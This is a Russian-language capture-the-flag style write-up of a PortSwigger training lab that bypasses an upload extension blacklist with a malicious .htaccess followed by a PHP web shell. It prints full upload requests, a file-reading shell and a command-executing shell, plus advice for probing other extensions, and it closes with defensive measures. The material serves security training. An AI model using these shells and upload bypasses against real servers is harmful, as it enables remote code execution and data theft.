# 📘 PortSwigger Lab: Web shell upload via extension blacklist bypass

<a id="top"></a>

> 🔗 Лабораторная работа: https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-extension-blacklist-bypass  
> 🎯 Тема: Unrestricted File Upload — обход blacklist расширений через .htaccess  
> 🧪 Уровень: Practitioner  
> ✅ Статус: Solved  

---

## 📑 Содержание

- [🎯 Цель](#goal)
- [🧠 Краткая теория](#theory)
- [🧩 Ключевая идея](#idea)
- [🦠 Проблема blacklist расширений](#blacklist)
- [⚙️ Что такое .htaccess и почему это критично](#htaccess)
- [🐚 Веб-шелл](#webshell)
- [⚡ Пейлоад эксплойта](#exploit)
- [🔍 Шаг 1 — Разведка функции загрузки и пути раздачи](#step1)
- [🔍 Шаг 2 — Попытка загрузки exploit.php и картирование фильтра](#step2)
- [🔍 Шаг 3 — Определить веб-сервер через заголовки ответа](#step3)
- [🔍 Шаг 4 — Загрузка вредоносного .htaccess](#step4)
- [🔍 Шаг 5 — Загрузка шелла под расширением .l33t](#step5)
- [🔍 Шаг 6 — Выполнение шелла и извлечение секрета](#step6)
- [📨 Примеры запросов](#requests)
- [📥 Пример результата](#response)
- [🧾 Полная цепочка атаки](#attack-chain)
- [🔬 Почему атака сработала](#breakdown)
- [🧠 Как думать как пентестер](#pentester)
- [🧪 Дополнительные проверки](#additional-tests)
- [❌ Типичные ошибки](#mistakes)
- [🛡 Защита](#defense)
- [✅ Чек-лист](#checklist)
- [🧾 Итог](#conclusion)

---

<a id="goal"></a>

## 🎯 Цель

Обойти blacklist запрещённых расширений, чтобы:

```text
1. Загрузить PHP веб-шелл под расширением, которого нет в blacklist.
2. Выполнить шелл через GET-запрос к загруженному файлу.
3. Эксфильтровать содержимое /home/carlos/secret и отправить его как решение.
```

Учётные данные тестового пользователя:

```text
wiener:peter
```

Подсказка лабы:

```text
Нужно загрузить два разных файла.
```

---

<a id="theory"></a>

## 🧠 Краткая теория

Blacklist расширений блокирует «опасные» суффиксы файлов:

```text
запрещено: .php
разрешено: всё остальное
```

Фундаментальный недостаток blacklist: **опасных расширений гораздо больше, чем `.php`**, а в случае Apache есть способ вообще **добавить новое правило исполнения изнутри директории загрузок**.

`.htaccess` — файл конфигурации Apache, действующий **в своей директории и ниже**. Если директория загрузок разрешает переопределение конфигурации (allow override), загруженный `.htaccess` меняет поведение сервера для всех файлов рядом — например, назначает произвольному расширению интерпретатор PHP:

```apache
AddType application/x-httpd-php .l33t
```

После этого файл `exploit.l33t` исполняется ровно как `exploit.php` — расширение не входит в blacklist, потому что его **не существовало** до атаки.

---

<a id="idea"></a>

## 🧩 Ключевая идея

Вместо того чтобы искать «непокрытое» расширение в blacklist (обходной путь), атакующий **перезаписывает правила сервера**:

```text
Файл 1 (.htaccess):  «с этого момента расширение .l33t — это PHP»
Файл 2 (exploit.l33t): сам шелл — под расширением, которого нет в blacklist
```

Blacklist не может заблокировать расширение, о котором не знает. А атакующий придумывает его сам — `.l33t` выбран просто как произвольная строка.

---

<a id="blacklist"></a>

## 🦠 Проблема blacklist расширений

Blacklist по определению отстаёт от реальности:

```text
Разработчик перечисляет:  .php, .php5, .phtml ...
Атакующий использует:     .l33t (изобретено сегодня)
```

Сравнение подходов:

```text
Blacklist  → блокирует известные плохие, всё остальное проходит
Whitelist  → разрешает только известные хорошие, всё остальное блокируется
```

Для исполняемых файлов blacklist принципиально слаб: множество опасных вариантов открыто (`.php`, `.php3`–`.php8`, `.phtml`, `.phps`, `.phar`, кастомные через конфигурацию), а для Apache добавляется вектор с `.htaccess`, который «перечислить» невозможно вовсе.

---

<a id="htaccess"></a>

## ⚙️ Что такое .htaccess и почему это критично

`.htaccess` — распределённый конфиг Apache. При каждом запросе Apache читает `.htaccess` из директории запрошенного файла и применяет директивы.

Директива из лабы:

```apache
AddType application/x-httpd-php .l33t
```

Разбор:

```text
AddType — сопоставляет расширение файлов MIME-типу
application/x-httpd-php — тип, обрабатываемый модулем mod_php
.l33t — произвольное расширение, назначенное атакующим
```

Поскольку сервер работает с mod_php, он «уже знает», как обращаться с этим типом — файлы `.l33t` исполняются как PHP.

Критичность: `.htaccess` превращает **функцию загрузки файлов** в **функцию изменения конфигурации сервера**. Это эскалация уровня «любой файл → контроль поведения веб-сервера».

---

<a id="webshell"></a>

## 🐚 Веб-шелл

Минимальный PHP-шелл для чтения целевого файла:

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

Универсальный вариант:

```php
<?php echo system($_GET['cmd']); ?>
```

---

<a id="exploit"></a>

## ⚡ Пейлоад эксплойта

Два файла:

### Файл 1 — .htaccess

```apache
AddType application/x-httpd-php .l33t
```

Content-Type в multipart-запросе:

```text
Content-Type: text/plain
```

### Файл 2 — exploit.l33t

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

---

<a id="step1"></a>

## 🔍 Шаг 1 — Разведка функции загрузки и пути раздачи

1. Авторизоваться под `wiener:peter`.
2. Загрузить обычное изображение как аватар.
3. Вернуться на страницу аккаунта.
4. В Burp → Proxy → HTTP history найти запрос раздачи аватара:

```http
GET /files/avatars/<YOUR-IMAGE> HTTP/1.1
```

и отправить его в Repeater.

---

<a id="step2"></a>

## 🔍 Шаг 2 — Попытка загрузки exploit.php и картирование фильтра

1. Создать локально `exploit.php`:

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

2. Попытаться загрузить как аватар. Ответ сервера:

```text
Вы не можете загружать файлы с расширением .php
```

Картирование фильтра:

```text
Механизм:        blacklist расширений
Известный блок:  .php
Неизвестно:      какие ещё расширения в списке, есть ли проверка содержимого
```

---

<a id="step3"></a>

## 🔍 Шаг 3 — Определить веб-сервер через заголовки ответа

В HTTP history открыть ответ на `POST /my-account/avatar` и изучить заголовки:

```http
Server: Apache
```

Сервер — **Apache**. Это ключевая разведка: значит, применим вектор с `.htaccess`. Отправить POST-запрос в Repeater.

Общая практика: `Server`, `X-Powered-By` и подобные заголовки определяют стек — а от стека зависит выбор техники (у nginx был бы вектор с `.user.ini`, у IIS — свои особенности).

---

<a id="step4"></a>

## 🔍 Шаг 4 — Загрузка вредоносного .htaccess

В Repeater, в POST /my-account/avatar, изменить часть файла:

```text
filename="exploit.php"    →  filename=".htaccess"
Content-Type: ...         →  Content-Type: text/plain
Тело файла                →  AddType application/x-httpd-php .l33t
```

Отправить. Ответ:

```text
The file avatars/.htaccess has been uploaded.
```

Конфигурация директории загрузок перезаписана: теперь `.l33t` исполняется как PHP.

---

<a id="step5"></a>

## 🔍 Шаг 5 — Загрузка шелла под расширением .l33t

1. Кнопкой «назад» в Repeater вернуться к исходному запросу загрузки PHP-файла.
2. Изменить только имя файла:

```text
filename="exploit.php"  →  filename="exploit.l33t"
```

3. Отправить. Ответ:

```text
The file avatars/exploit.l33t has been uploaded.
```

`.l33t` отсутствует в blacklist — загрузка проходит. Содержимое остаётся PHP-шеллом.

---

<a id="step6"></a>

## 🔍 Шаг 6 — Выполнение шелла и извлечение секрета

В Repeater-вкладке с запросом раздачи аватара заменить имя файла:

```http
GET /files/avatars/exploit.l33t HTTP/1.1
```

Отправить. Благодаря вредоносному `.htaccess` сервер исполняет `.l33t` как PHP, и в ответе возвращается секрет:

```text
SECRET-VALUE-HERE
```

Отправить секрет через кнопку в баннере лабы.

Лаборатория получает статус:

```text
Solved
```

---

<a id="requests"></a>

## 📨 Примеры запросов

### Разведка: раздача аватара

```http
GET /files/avatars/avatar.png HTTP/1.1
Host: LAB-ID.web-security-academy.net
```

### Блокированная загрузка (эталон)

```http
POST /my-account/avatar HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
Content-Type: multipart/form-data; boundary=--------------------

--------------------
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: application/x-php

<?php echo file_get_contents('/home/carlos/secret'); ?>
--------------------
Content-Disposition: form-data; name="user"

wiener
--------------------
Content-Disposition: form-data; name="csrf"

YOUR-CSRF-TOKEN
--------------------
```

Ответ:

```text
Вы не можете загружать файлы с расширением .php
```

### Рабочая загрузка 1 — вредоносный .htaccess

```http
POST /my-account/avatar HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
Content-Type: multipart/form-data; boundary=--------------------

--------------------
Content-Disposition: form-data; name="avatar"; filename=".htaccess"
Content-Type: text/plain

AddType application/x-httpd-php .l33t
--------------------
Content-Disposition: form-data; name="user"

wiener
--------------------
Content-Disposition: form-data; name="csrf"

YOUR-CSRF-TOKEN
--------------------
```

### Рабочая загрузка 2 — шелл под .l33t

```http
POST /my-account/avatar HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
Content-Type: multipart/form-data; boundary=--------------------

--------------------
Content-Disposition: form-data; name="avatar"; filename="exploit.l33t"
Content-Type: application/x-php

<?php echo file_get_contents('/home/carlos/secret'); ?>
--------------------
Content-Disposition: form-data; name="user"

wiener
--------------------
Content-Disposition: form-data; name="csrf"

YOUR-CSRF-TOKEN
--------------------
```

### Запрос к шеллу

```http
GET /files/avatars/exploit.l33t HTTP/1.1
Host: LAB-ID.web-security-academy.net
```

---

<a id="response"></a>

## 📥 Пример результата

### Ответ загрузки .htaccess

```text
The file avatars/.htaccess has been uploaded.
```

### Ответ загрузки exploit.l33t

```text
The file avatars/exploit.l33t has been uploaded.
```

### Ответ шелла

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8

SECRET-VALUE-HERE
```

Статус лаборатории:

```text
Solved
```

---

<a id="attack-chain"></a>

## 🧾 Полная цепочка атаки

```text
1. Авторизоваться под wiener:peter
2. Загрузить тестовое изображение, найти GET /files/avatars/ в history
3. Попытаться загрузить exploit.php → блокировка по расширению
4. Определить сервер как Apache по заголовкам ответа
5. Загрузить .htaccess с директивой AddType application/x-httpd-php .l33t
6. Загрузить exploit.l33t с тем же PHP-телом — расширение вне blacklist
7. GET /files/avatars/exploit.l33t → Apache исполняет как PHP
8. Секрет получен и отправлен — лаба Solved
```

---

<a id="breakdown"></a>

## 🔬 Почему атака сработала

### 1. Blacklist не может перечислить неизобретённое

`.l33t` — расширение, которого не существовало до атаки. Ни один blacklist его не содержит, потому что перечислять можно только известное.

### 2. Функция загрузки перезаписывает конфигурацию сервера

`.htaccess` в директории загрузок + разрешённое переопределение конфигурации = атакующий меняет правила исполнения **изнутри** защищаемой зоны. Это фундаментальная ошибка архитектуры, а не просто «плохой список».

### 3. Фильтр проверяет только имя файла

Content-Type, содержимое и двойные файлы не проверяются — загрузка `.htaccess` прошла без препятствий.

### 4. Разведка стека определила технику

Заголовок `Server: Apache` подсказал именно `.htaccess`-вектор. Без определения стека атакующий мог бы потратить время на неприменимые техники.

### 5. mod_php интерпретирует назначенный тип

`application/x-httpd-php` — «родной» тип для mod_php, дополнительная настройка не нужна: директива `AddType` сразу включает исполнение.

---

<a id="pentester"></a>

## 🧠 Как думать как пентестер

Порядок действий при blacklist расширений:

```text
1. Картируй список: пробуй .php, .php5, .phtml, .phar — что блокируется?
2. Определи стек: Server / X-Powered-By / поведенческие признаки
   (Apache → .htaccess, nginx → .user.ini, IIS → web.config-специфика)
3. Ищи "конфигурационные" файлы: если загрузка принимает
   .htaccess / .user.ini / web.config — это эскалация до контроля сервера
4. Придумывай своё расширение: blacklist не может блокировать то,
   чего не существует
```

Альтернативные расширения для пробы (когда вектор с `.htaccess` недоступен):

```text
.php5  .php7  .phtml  .phar  .phps  .pht
```

---

<a id="additional-tests"></a>

## 🧪 Дополнительные проверки

В рамках разрешённой лаборатории можно сравнить:

### Универсальный шелл

```php
<?php echo system($_GET['cmd']); ?>
```

```text
GET /files/avatars/exploit.l33t?cmd=whoami
GET /files/avatars/exploit.l33t?cmd=ls+/home/carlos
```

### Другие выдуманные расширения

```text
AddType application/x-httpd-php .backdoor
AddType application/x-httpd-php .config
```

### Картирование blacklist

```text
exploit.php5   → заблокировано или нет?
exploit.phtml  → заблокировано или нет?
exploit.txt    → загрузится (но не исполнится)
```

---

<a id="mistakes"></a>

## ❌ Типичные ошибки

### Ошибка 1. Не определить сервер до выбора техники

Без `Server: Apache` вектор с `.htaccess` не приходит в голову — вместо этого атакующий тратит время на перебор расширений.

### Ошибка 2. Забыть сменить Content-Type у .htaccess

В официальном решении у `.htaccess` указывается `Content-Type: text/plain`. Если оставить MIME от PHP, фильтр (или сервер) может повести себя неожиданно.

### Ошибка 3. Оставить в теле .htaccess PHP-код

В теле файла должна быть **директива**, а не `<?php ... ?>`. Если не заменить содержимое, конфигурация не перезапишется.

### Ошибка 4. Загрузить exploit.l33t до .htaccess

Порядок критичен: сначала правило, потом файл. Без `.htaccess` расширение `.l33t` не сопоставлено с PHP — файл сохранится, но исполнится как текст.

### Ошибка 5. Искать «непокрытое» расширение перебором вместо .htaccess

Перебор `.php5`/`.phtml` может увязнуть — в этой лабе blacklist, судя по всему, широкий. Вектор с конфигурацией надёжнее и быстрее.

### Ошибка 6. Забыть вернуть исходный запрос через «назад» в Repeater

Удобный workflow: правки делаются в одном и том же POST-запросе (`.htaccess` → откат → `exploit.l33t`), а не создаются заново.

---

<a id="defense"></a>

## 🛡 Защита

### 1. Whitelist расширений вместо blacklist

Разрешать только `jpg`, `jpeg`, `png`, `webp` — отклонять всё остальное, включая незнакомые расширения.

### 2. Запретить .htaccess в директориях загрузок

На уровне конфигурации Apache:

```apache
<Directory /files/avatars/>
    AllowOverride None
</Directory>
```

А лучше — запретить загрузку файлов, начинающихся с точки (dotfiles) вообще.

### 3. Случайные имена файлов

Серверное имя (UUID) исключает сохранение `.htaccess` под нужным именем и предсказуемые пути.

### 4. Хранение вне веб-корня

Раздавать файлы через отдельный эндпоинт из директории, где нет ни исполнения, ни `.htaccess`-обработки.

### 5. Проверка содержимого

Magic bytes + переобработка изображений, независимо от имени и MIME.

### 6. Минимизировать раскрытие стека

Убрать `Server` / `X-Powered-By` — уменьшает подсказки для выбора техники (security through obscurity, но снижает шум разведки).

---

<a id="checklist"></a>

## ✅ Чек-лист

### Разведка

- [ ] Авторизован под wiener:peter
- [ ] Загружено тестовое изображение
- [ ] Найден `GET /files/avatars/<image>` в HTTP history
- [ ] GET-запрос отправлен в Repeater

### Картирование фильтра

- [ ] Загрузка `exploit.php` заблокирована (.php в blacklist)
- [ ] Заголовки ответа раскрывают `Server: Apache`
- [ ] POST-запрос отправлен в Repeater

### Эксплуатация

- [ ] Загружен `.htaccess` с `AddType application/x-httpd-php .l33t` (Content-Type: text/plain)
- [ ] Загружен `exploit.l33t` с PHP-телом
- [ ] `GET /files/avatars/exploit.l33t` возвращает секрет
- [ ] Секрет отправлен
- [ ] Статус лабы: Solved

---

<a id="conclusion"></a>

## 🧾 Итог

Лаборатория решена через **двухэтапный обход blacklist расширений**:

```text
1. Загружен .htaccess: «расширение .l33t теперь исполняется как PHP»
2. Загружен exploit.l33t — расширение вне blacklist
3. Apache исполняет шелл → секрет прочитан
```

Главные выводы:

```text
Blacklist расширений принципиально слаб: опасных вариантов открытое множество.
```

```text
.htaccess превращает загрузку файлов в изменение конфигурации сервера —
это эскалация архитектурного уровня.
```

```text
Определение стека (Server: Apache) — обязательный шаг разведки,
от него зависит выбор техники обхода.
```

```text
Единственная надёжная защита — whitelist + запрет конфигурационных файлов
+ хранение вне исполняемых директорий.
```

---

[⬆ Вернуться к началу](#top)
